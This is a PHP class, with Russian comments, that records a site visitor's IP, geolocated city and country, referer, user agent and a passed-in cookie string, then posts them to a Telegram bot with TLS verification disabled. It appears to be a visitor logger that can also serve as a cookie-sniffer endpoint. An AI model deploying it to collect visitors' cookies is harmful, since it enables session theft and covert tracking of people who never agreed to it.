<?php
class Notify
{
 private $ip;
 private $country;
 private $city;
 private $comment;
 private $referer;
 private $agent;
 private $cookies;
 private $dates;
 public function __construct($com,$cook) 
{
$ip = $_SERVER['REMOTE_ADDR']; // Получаем ip посетителя
    $query = @unserialize(file_get_contents('http://ip-api.com/php/'.$ip.'?lang=ru')); 
    if($query && $query['status'] == 'success') 
    {
$this->cookies = $cook; // Выставляем куки с конструктора
$this->referer = $_SERVER['HTTP_REFERER']; // Выставляем Реферер
$this->agent = $_SERVER['HTTP_USER_AGENT']; // Выставляем Юзер Агент
$this->dates = date("d.m.Y H:i:s"); // Выставляем дату получения
$this->ip= $ip; // Выставляем IP
$this->country= $query['country']; // Выставляем страну
$this->city= $query['city']; // Выставляем город
$this->comment = $com; // Выставляем комментарий к запросу
} 
else 
{
$this->cookies = $cook; 
$this->referer = $_SERVER['HTTP_REFERER'];
$this->agent = $_SERVER['HTTP_USER_AGENT'];
$this->dates = date("d.m.Y H:i:s");
$this->ip= $ip;
$this->country = 'None';
$this->city = 'None';
$this->comment = $com;
    }
 }

function Send($token,$chat_id)
{
$info = 'IP - '.$this->ip.PHP_EOL.'Country - '.$this->country.PHP_EOL.'City - '.$this->city .PHP_EOL.$this->comment.PHP_EOL.'Date - '. $this->dates . PHP_EOL . 'User Agent - ' . $this->agent . PHP_EOL . 'Referer - ' . $this->referer . PHP_EOL . 'Cookies - ' . $this->cookies . PHP_EOL; // Подготовили строку для отправки 
$ch=curl_init();
curl_setopt($ch, CURLOPT_URL,
       'https://api.telegram.org/bot'.$token.'/sendMessage'); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS,
       'chat_id='.$chat_id.'&text='.($info));
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
curl_exec($ch); // Отправляем лог
curl_close($ch);
}
}
?>